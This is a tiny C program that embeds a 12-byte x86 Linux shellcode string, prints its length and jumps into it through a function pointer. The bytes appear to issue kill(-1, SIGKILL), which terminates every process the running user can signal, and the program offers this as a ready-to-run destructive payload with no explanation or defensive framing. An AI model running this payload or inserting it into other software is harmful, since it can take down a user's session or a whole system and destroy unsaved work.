#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xdb\x4b\xb1\x08\xb0\x63\x2c\x3e\x41\xcd\x80";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
